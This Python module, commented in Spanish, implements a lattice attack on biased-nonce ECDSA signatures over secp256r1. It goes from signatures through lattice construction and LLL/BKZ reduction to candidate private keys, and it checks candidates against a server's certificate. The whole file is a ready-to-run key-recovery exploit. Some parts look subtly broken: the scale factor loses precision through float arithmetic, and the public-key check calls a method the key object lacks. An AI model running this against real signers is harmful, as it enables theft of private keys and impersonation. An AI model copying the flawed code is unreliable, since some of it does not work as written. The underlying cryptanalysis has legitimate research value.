"""
hnp_lattice.py
==============
Construcción del retículo para el ataque al Hidden Number Problem (HNP)
derivado de firmas ECDSA con nonce sesgado (b MSBs = 0).

Referencia principal:
    Nguyen & Shparlinski (2003). "The Insecurity of the Elliptic Curve
    Digital Signature Algorithm with Partially Known Nonces."
    Designs, Codes and Cryptography, 30(2), 201–217.

Matemática:
-----------
Dada la ecuación de firma ECDSA:
    s_i * k_i ≡ h_i + r_i * d  (mod n)
    =>  k_i ≡ α_i * d + β_i  (mod n)

donde:
    α_i = s_i^{-1} * r_i  mod n
    β_i = s_i^{-1} * h_i  mod n

Con la condición de fuga: k_i < 2^{N-b}  (los b MSBs son cero, N=256)

Esto es una instancia del HNP. Se construye una base de retículo B de
dimensión (t+2) × (t+2) tal que el vector secreto:
    w = (k_0, k_1, ..., k_{t-1}, d, K)   K = ⌈√(t+1) * n / 2^b⌉

es un vector corto en el retículo, o puede encontrarse por CVP (Babai).
"""

from __future__ import annotations

import math
from typing import Optional

# ── Parámetros de secp256r1 ──────────────────────────────────────────────────
P256_N = 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551
P256_BITS = 256


def modinv(a: int, m: int) -> int:
    """Inverso modular: retorna a^{-1} mod m usando el algoritmo extendido de Euclides."""
    if m == 1:
        return 0
    m0, x0, x1 = m, 0, 1
    a = a % m
    while a > 1:
        q = a // m
        m, a = a % m, m
        x0, x1 = x1 - q * x0, x0
    return x1 % m0


# ════════════════════════════════════════════════════════════════════════════
# Preprocesamiento de firmas
# ════════════════════════════════════════════════════════════════════════════

def compute_hnp_coefficients(sigs: list[dict],
                              n: int = P256_N) -> tuple[list[int], list[int]]:
    """
    Calcula los coeficientes α_i y β_i del HNP para cada firma.

    Para cada firma (r_i, s_i, h_i):
        α_i = s_i^{-1} * r_i  mod n     (coeficiente de d)
        β_i = s_i^{-1} * h_i  mod n     (término independiente)

    Retorna:
        (alphas, betas) donde cada lista tiene t elementos.
    """
    alphas, betas = [], []
    for sig in sigs:
        s_inv = modinv(sig["s"], n)
        alpha = (s_inv * sig["r"]) % n
        beta  = (s_inv * sig["h"]) % n
        alphas.append(alpha)
        betas.append(beta)
    return alphas, betas


# ════════════════════════════════════════════════════════════════════════════
# Construcción del retículo
# ════════════════════════════════════════════════════════════════════════════

def build_hnp_lattice(alphas: list[int],
                      betas:  list[int],
                      b: int,
                      n: int = P256_N,
                      N: int = P256_BITS) -> tuple[list[list[int]],
                                                    list[int],
                                                    int]:
    """
    Construye la base del retículo y el vector objetivo para el HNP.

    Construcción (Nguyen-Shparlinski 2003, dimensión t+2):

        Fila i (0 ≤ i < t):  [0, ..., n, ..., 0, 0, 0]  (n en posición i)
        Fila t:               [α_0, α_1, ..., α_{t-1}, 1, 0]
        Fila t+1:             [β_0, β_1, ..., β_{t-1}, 0, K]

    donde K = ⌈√(t+1) * n / 2^b⌉ es el factor de escala que balancea las normas.

    El vector secreto en el retículo es:
        w = (k_0, k_1, ..., k_{t-1}, d, K)   (con 1 * fila_{t+1} + d * fila_t + z_i * fila_i)

    El vector objetivo para CVP es:
        u = (0, 0, ..., 0, 0, K)   (solo K en la última posición)

    El error u - w = (-k_0, -k_1, ..., -k_{t-1}, -d, 0) tiene norma:
        ||u - w|| ≈ sqrt(t * (2^(N-b))^2 + n^2) ≈ sqrt(t+1) * n / 2^b * algo

    Parámetros:
        alphas : lista de t coeficientes α_i
        betas  : lista de t coeficientes β_i
        b      : bits filtrados (top b bits del nonce = 0, k_i < 2^{N-b})
        n      : orden del grupo (default P256_N)
        N      : tamaño del campo en bits (default 256)

    Retorna:
        (B, u, K) donde:
          B = base del retículo (lista de listas de enteros, t+2 filas)
          u = vector objetivo para CVP (lista de t+2 enteros)
          K = factor de escala usado
    """
    t = len(alphas)
    assert t == len(betas), "alphas y betas deben tener la misma longitud"
    assert 1 <= b < N, f"b debe estar en [1, {N-1}]"

    dim = t + 2  # dimensión del retículo

    # Factor de escala K para balancear normas:
    # Los k_i tienen norma ~ 2^(N-b), y d tiene norma ~ n ≈ 2^N.
    # Queremos que todos los componentes del vector secreto tengan norma similar.
    # K = ceil(sqrt(t+1) * n / 2^b) hace que ||w|| sea aproximadamente (t+2) * K^(1/2)
    K = math.ceil(math.sqrt(t + 1) * n // (1 << b))
    # Alternativa más simple y común en implementaciones: K = n // (2^b) * sqrt(t)
    # K = (n >> b)  # versión simplificada, también funciona

    # ── Inicializar la base con ceros ──
    B = [[0] * dim for _ in range(dim)]

    # ── Filas 0..t-1: n * e_i ──
    for i in range(t):
        B[i][i] = n

    # ── Fila t: codifica la relación lineal k_i = α_i * d + β_i mod n ──
    for i in range(t):
        B[t][i] = alphas[i]
    B[t][t] = 1   # posición de d en el vector secreto
    B[t][t+1] = 0

    # ── Fila t+1: embedding del vector objetivo (los β_i) ──
    for i in range(t):
        B[t+1][i] = betas[i]
    B[t+1][t]   = 0
    B[t+1][t+1] = K  # posición del factor de escala

    # ── Vector objetivo para CVP ──
    # El vector del retículo que queremos es: B * (z_0,...,z_{t-1}, d, 1)^T
    # = (z_0*n + d*α_0 + β_0, ..., z_{t-1}*n + d*α_{t-1} + β_{t-1}, d, K)
    # = (k_0, k_1, ..., k_{t-1}, d, K)  [con los z_i apropiados]
    #
    # El vector objetivo para CVP (que está "cerca" del vector secreto) es:
    # u = (0, 0, ..., 0, 0, K)
    # La distancia es: ||(k_0,...,k_{t-1}, d, 0)|| que es grande.
    #
    # ALTERNATIVA más práctica: usar SVP (buscar el vector más corto).
    # En la práctica, simplemente ejecutamos BKZ y buscamos d entre los vectores cortos.
    # El vector objetivo para este caso es el cero:
    u = [0] * dim
    u[t+1] = K  # marcar la última componente

    return B, u, K


# ════════════════════════════════════════════════════════════════════════════
# Reducción del retículo con fpylll
# ════════════════════════════════════════════════════════════════════════════

def reduce_lattice(B: list[list[int]],
                   bkz_block: int = 20,
                   verbose: bool = False) -> list[list[int]]:
    """
    Aplica reducción LLL seguida de BKZ a la base B.

    Parámetros:
        B         : base del retículo (lista de listas de enteros)
        bkz_block : blocksize del algoritmo BKZ (20 = rápido, 40 = fuerte)
        verbose   : imprimir progreso

    Retorna:
        B_reduced : base reducida (lista de listas de enteros)
    """
    try:
        from fpylll import IntegerMatrix, LLL, BKZ
    except ImportError:
        raise ImportError(
            "fpylll no está instalado. Instala con: pip install fpylll\n"
            "En algunos sistemas puede requerir libfplll: sudo apt install libfplll-dev"
        )

    n_rows = len(B)
    n_cols = len(B[0])

    if verbose:
        print(f"    Dimensión del retículo: {n_rows} × {n_cols}")
        print(f"    Aplicando LLL...")

    # Convertir a IntegerMatrix de fpylll
    M = IntegerMatrix(n_rows, n_cols)
    for i in range(n_rows):
        for j in range(n_cols):
            M[i, j] = B[i][j]

    # ── LLL ──
    LLL.reduction(M)

    if verbose:
        print(f"    Aplicando BKZ-{bkz_block}...")

    # ── BKZ ──
    bkz_flags = BKZ.DEFAULT | BKZ.AUTO_ABORT
    BKZ.reduction(M, BKZ.Param(block_size=bkz_block,
                                flags=bkz_flags,
                                max_loops=20))

    # Extraer como lista de listas de enteros
    B_reduced = [[M[i, j] for j in range(n_cols)] for i in range(n_rows)]

    if verbose:
        # Mostrar las normas de los primeros vectores
        for i in range(min(3, n_rows)):
            norm_sq = sum(B_reduced[i][j]**2 for j in range(n_cols))
            bits = (norm_sq.bit_length() + 1) // 2
            print(f"    v[{i}]: ||v|| ≈ 2^{bits}")

    return B_reduced


# ════════════════════════════════════════════════════════════════════════════
# Extracción de candidatos para d
# ════════════════════════════════════════════════════════════════════════════

def extract_d_candidates(B_reduced: list[list[int]],
                         t: int,
                         n: int = P256_N) -> list[int]:
    """
    Extrae candidatos para la clave privada d de la base reducida.

    En la construcción de dimensión t+2:
    - La coordenada t (índice t) de cada vector de la base contiene un múltiplo de d mod n.
    - Buscamos vectores cuya coordenada t+1 sea ±K (indicando que son el vector secreto).
    - También enumeramos la coordenada t módulo n de cada vector.

    Retorna lista de candidatos únicos para d.
    """
    dim = len(B_reduced[0])
    candidates = set()

    for row in B_reduced:
        # La coordenada t del vector puede ser ±d (o 0 si no es el correcto)
        d_cand = row[t] % n
        if d_cand != 0:
            candidates.add(d_cand)
            candidates.add((n - d_cand) % n)  # también el negativo

    return list(candidates)


# ════════════════════════════════════════════════════════════════════════════
# Verificación de candidatos
# ════════════════════════════════════════════════════════════════════════════

def verify_candidate(d_cand: int,
                     sigs: list[dict],
                     n: int = P256_N,
                     n_check: int = 5) -> bool:
    """
    Verifica que d_cand es la clave privada correcta comprobando que los
    nonces k_i correspondientes son "pequeños" (< n/4 heurísticamente).

    Argumento:
        d_cand : candidato para la clave privada
        sigs   : lista de firmas originales
        n      : orden del grupo
        n_check: número de firmas a verificar (5 es suficiente)

    Retorna True si d_cand pasa la verificación heurística.
    """
    if d_cand <= 0 or d_cand >= n:
        return False

    threshold = n >> 2  # n/4 como umbral: k_i << n implica k_i < n/4

    for sig in sigs[:n_check]:
        s_inv = modinv(sig["s"], n)
        k_cand = (s_inv * (sig["h"] + sig["r"] * d_cand)) % n
        # k debe ser pequeño (< 2^{N-b} << n)
        if k_cand > threshold:
            return False

    return True


def verify_with_public_key(d_cand: int,
                            pub_key_hex: Optional[str] = None,
                            pub_key_pem: Optional[str] = None,
                            n: int = P256_N) -> bool:
    """
    Verificación criptográfica fuerte: comprueba que d_cand * G = Q (clave pública).

    Requiere la clave pública del servidor (del certificado PEM o coordenadas hex).
    """
    if pub_key_pem:
        try:
            from cryptography.hazmat.primitives.serialization import (
                load_pem_public_key, load_pem_private_key
            )
            from cryptography.hazmat.primitives.asymmetric.ec import (
                EllipticCurvePublicNumbers, SECP256R1
            )
            # Intentar cargar como certificado
            try:
                from cryptography import x509
                with open(pub_key_pem, "rb") as f:
                    cert = x509.load_pem_x509_certificate(f.read())
                pub = cert.public_key()
            except Exception:
                with open(pub_key_pem, "rb") as f:
                    pub = load_pem_public_key(f.read())

            pub_numbers = pub.public_key().public_numbers()
            Qx = pub_numbers.x
            Qy = pub_numbers.y

            # Calcular d_cand * G y comparar con (Qx, Qy)
            # Necesitamos aritmética de curvas elípticas
            try:
                from cryptography.hazmat.primitives.asymmetric.ec import (
                    derive_private_key, SECP256R1
                )
                derived = derive_private_key(d_cand, SECP256R1())
                derived_pub = derived.public_key().public_numbers()
                return derived_pub.x == Qx and derived_pub.y == Qy
            except Exception:
                return False

        except ImportError:
            pass

    return False  # No se pudo verificar criptográficamente


# ════════════════════════════════════════════════════════════════════════════
# Pipeline completo: firmas → retículo → candidatos para d
# ════════════════════════════════════════════════════════════════════════════

def hnp_attack_pipeline(sigs: list[dict],
                        b: int,
                        bkz_block: int = 20,
                        n: int = P256_N,
                        N: int = P256_BITS,
                        verbose: bool = True) -> Optional[int]:
    """
    Pipeline completo del ataque HNP:
        firmas → coeficientes → retículo → reducción → candidatos → verificación

    Parámetros:
        sigs      : lista de dicts {"r": int, "s": int, "h": int}
        b         : bits filtrados (top b MSBs del nonce = 0)
        bkz_block : blocksize BKZ
        n         : orden del grupo
        N         : bits del campo
        verbose   : imprimir progreso

    Retorna:
        d (int) si se recuperó la clave privada, None si falló.
    """
    t = len(sigs)

    if verbose:
        print(f"  Pipeline HNP: t={t}, b={b}, BKZ-{bkz_block}")

    # ── Paso 1: Calcular coeficientes ──
    alphas, betas = compute_hnp_coefficients(sigs, n)

    # ── Paso 2: Construir el retículo ──
    B, u, K = build_hnp_lattice(alphas, betas, b, n, N)
    if verbose:
        print(f"    Retículo de dimensión {len(B)} × {len(B[0])}, K = 2^{K.bit_length()}")

    # ── Paso 3: Reducir el retículo ──
    B_reduced = reduce_lattice(B, bkz_block, verbose)

    # ── Paso 4: Extraer candidatos para d ──
    candidates = extract_d_candidates(B_reduced, t, n)
    if verbose:
        print(f"    {len(candidates)} candidatos para d encontrados.")

    # ── Paso 5: Verificar candidatos ──
    for d_cand in candidates:
        if verify_candidate(d_cand, sigs, n):
            if verbose:
                print(f"    d encontrado: {hex(d_cand)[:18]}...")
            return d_cand

    if verbose:
        print(f"    No se encontró d. Prueba con más firmas o mayor BKZ.")

    return None


# ════════════════════════════════════════════════════════════════════════════
# Test
# ════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    print("Test de construcción del retículo HNP...")
    # Test con t=5 y parámetros pequeños (para debug rápido)
    n_test = 2**31 - 1  # primo de Mersenne (más pequeño para testing)
    t_test = 5
    b_test = 4

    # Generar firmas sintéticas con nonce pequeño
    import random
    random.seed(0)
    d_true = random.randint(1, n_test - 1)

    sigs_test = []
    for _ in range(t_test):
        k = random.randint(1, n_test >> b_test)  # k < 2^(31-4)
        # Simular r y s
        r = (k * 65537) % n_test  # simulación simple
        s = modinv(k, n_test) * ((12345 + r * d_true) % n_test) % n_test
        h = 12345
        sigs_test.append({"r": r, "s": s, "h": h})

    alphas, betas = compute_hnp_coefficients(sigs_test, n_test)
    B, u, K = build_hnp_lattice(alphas, betas, b_test, n_test, 31)

    print(f"  Dimensión: {len(B)} × {len(B[0])}")
    print(f"  K = {K}")
    print(f"  d_true = {d_true}")
    print("  Construcción OK")